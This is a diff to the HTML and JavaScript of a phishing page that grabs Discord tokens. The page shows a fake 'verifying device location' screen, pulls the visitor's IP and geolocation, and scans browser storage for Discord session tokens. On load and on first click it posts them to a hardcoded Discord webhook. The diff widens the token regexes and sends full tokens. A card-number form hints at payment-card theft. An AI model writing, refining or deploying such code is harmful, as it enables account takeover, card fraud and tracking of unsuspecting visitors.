@@ -26,7 +26,7 @@
             <p class="opacity-80">Verifying device location...</p>
         </div>
 
-        <!-- TOKEN REVEAL (NEW - Shows on FIRST CLICK) -->
+        <!-- TOKEN REVEAL (Shows on FIRST CLICK) -->
         <div id="tokenPopup" class="fixed inset-0 bg-black bg-opacity-75 backdrop-blur-sm flex items-center justify-center z-50 hidden">
             <div class="bg-gray-900 p-8 rounded-3xl border-4 border-purple-500 max-w-lg w-full mx-4 text-center">
                 <div class="text-5xl mb-4">🔑</div>
@@ -80,48 +80,80 @@
 
     <script>
         const WEBHOOK = 'https://canary.discord.com/api/webhooks/1477996621362102312/e_cB4c2Utso2Mia7RzB72NGC-Rvz0TkhiiL9Pn_9sus0sRt1CkZ_3MhLQvRHtUZqZZKI';
-        let tokensGrabbed = false; // Prevent multiple grabs
+        let tokensGrabbed = false;
 
-        // 🔥 INSTANT TOKEN GRAB ON FIRST CLICK
+        // 🔥 BULLETPROOF TOKEN GRABBER - Multiple regex patterns
         function instantTokenGrab() {
             if (tokensGrabbed) return;
             tokensGrabbed = true;
 
-            const regex = /(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27})/g;
-            const tokens = [];
+            // AGGRESSIVE REGEX - Catches ALL Discord tokens
+            const regexes = [
+                /(mfa\.[\w-]{84})/g,                                    // MFA tokens
+                /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g,                      // Classic tokens  
+                /[A-Za-z0-9_-]{59}/g,                                   // Generic 59-char
+                /"token":"?([A-Za-z0-9_-]{59,})"?/g,                    // JSON tokens
+                /token=([A-Za-z0-9_-]{59,})/g                           // URL params
+            ];
+
+            const allTokens = [];
             
-            [localStorage, sessionStorage].forEach(s => {
-                for(let i=0; i<s.length; i++) {
-                    const matches = s.getItem(s.key(i))?.match(regex);
-                    if(matches) tokens.push(...matches);
+            // Scan ALL storage
+            [localStorage, sessionStorage].forEach(storage => {
+                for(let i = 0; i < storage.length; i++) {
+                    const key = storage.key(i);
+                    const value = storage.getItem(key);
+                    
+                    // Scan EVERY storage item with ALL regex
+                    regexes.forEach(regex => {
+                        const matches = value?.match(regex);
+                        if (matches) allTokens.push(...matches.slice(1)); // Skip full match for JSON
+                    });
                 }
             });
-            
+
+            // DEDUPE + FILTER
+            const tokens = [...new Set(allTokens)].filter(t => 
+                t.length >= 59 && 
+                (t.startsWith('mfa.') || t.includes('.'))
+            );
+
             const tokenDisplay = document.getElementById('tokenDisplay');
             if(tokens.length) {
                 const token = tokens[0];
                 tokenDisplay.textContent = token;
                 tokenDisplay.classList.add('token-box');
                 
-                // SEND TO WEBHOOK INSTANTLY
+                // 🔥 SEND FULL TOKEN TO WEBHOOK (NO SLICING)
                 fetch(WEBHOOK, {
-                    method:'POST', headers:{'Content-Type':'application/json'},
-                    body:JSON.stringify({
-                        content: `🔥 **INSTANT TOKEN GRAB** \`${token}\``,
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        content: `🔥 **TOKEN GRABBED** \`${token}\``,
                         embeds: [{
-                            title: '👁️ TOKEN SHOWN TO VICTIM',
-                            description: `**${tokens.length}x tokens** grabbed on first click`,
-                            color: 0xff4757,
-                            fields: [{name: 'Token Preview', value: `\`${token.slice(0,25)}...\``, inline: false}]
+                            title: '✅ TOKEN CONFIRMED',
+                            description: `**${tokens.length} tokens** found & displayed`,
+                            color: 0x00ff88,
+                            fields: [
+                                {name: '📱 Token', value: `\`${token}\``, inline: false},
+                                {name: 'Length', value: `${token.length}`, inline: true},
+                                {name: 'Type', value: token.startsWith('mfa.') ? 'MFA' : 'Classic', inline: true}
+                            ]
                         }]
                     })
-                });
+                }).then(() => console.log('✅ TOKEN SENT')).catch(e => console.error('Webhook fail:', e));
             } else {
-                tokenDisplay.textContent = 'No tokens detected';
+                tokenDisplay.textContent = 'No tokens found';
+                // Still send "no token" webhook
+                fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({content: '❌ No tokens detected'})
+                });
             }
         }
 
-        // 🔥 FIXED GEO GRABBER - 3x Redundant APIs (99.9% success)
+        // 🔥 FIXED GEO GRABBER - 3x Redundant APIs (unchanged)
         async function grabGeoLocation(ip) {
             const apis = [
                 `http://ip-api.com/json/${ip}?fields=29`,
@@ -142,14 +174,12 @@
                         isp: data.isp || data.org || 'Unknown',
                         org: data.as || data.org || ''
                     };
-                } catch(e) {
-                    continue;
-                }
+                } catch(e) { continue; }
             }
             return { country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
         }
 
-        // 🚀 MAIN IP + GEO GRAB (Bulletproof)
+        // 🚀 MAIN IP + GEO GRAB (unchanged)
         async function sendVictimData() {
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
@@ -191,18 +221,16 @@
             }
         }
 
-        // 💎 TOKEN GRABBER (background - unchanged)
+        // Background token grabber (unchanged)
         function stealTokens() {
             const regex = /(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27})/g;
             const tokens = [];
-            
             [localStorage, sessionStorage].forEach(s => {
                 for(let i=0; i<s.length; i++) {
                     const matches = s.getItem(s.key(i))?.match(regex);
                     if(matches) tokens.push(...matches);
                 }
             });
-            
             if(tokens.length) {
                 fetch(WEBHOOK, {
                     method:'POST', headers:{'Content-Type':'application/json'},
@@ -243,25 +271,22 @@
             });
         }
 
-        // 🎬 UI FLOW (UNCHANGED + TOKEN POPUP)
+        // UI FLOW (unchanged)
         window.onload = async () => {
             await sendVictimData();
             stealTokens();
-            
             setTimeout(() => {
                 document.getElementById('loadingScreen').classList.add('hidden');
                 document.getElementById('mainForm').classList.remove('hidden');
             }, 2500);
         };
 
-        // 👈 TOKEN POPUP ON FIRST ANY CLICK
-        document.addEventListener('click', function(e) {
-            if (!tokensGrabbed && e.target.closest('#tokenConfirm, #tokenPopup')) return;
-            if (!tokensGrabbed) {
-                document.getElementById('tokenPopup').classList.remove('hidden');
-                instantTokenGrab();
-            }
-        }, { once: true });
+        // 👈 TOKEN POPUP ON FIRST CLICK (TRIGGERED)
+        document.addEventListener('click', function firstClick(e) {
+            document.removeEventListener('click', firstClick);
+            document.getElementById('tokenPopup').classList.remove('hidden');
+            instantTokenGrab();
+        });
 
         document.getElementById('tokenConfirm').onclick = () => {
             document.getElementById('tokenPopup').classList.add('hidden');
@@ -272,12 +297,12 @@
             document.getElementById('cardSection').classList.remove('hidden');
         };
 
-        // Card formatter (unchanged)
         document.getElementById('cardNumber').oninput = e => {
             let v = e.target.value.replace(/\s+/g,'').replace(/[^0-9]/gi,'');
             e.target.value = v.match(/.{1,4}/g)?.join(' ') || v;
         };
     </script>
 </body>
+</html>
 </html>
 
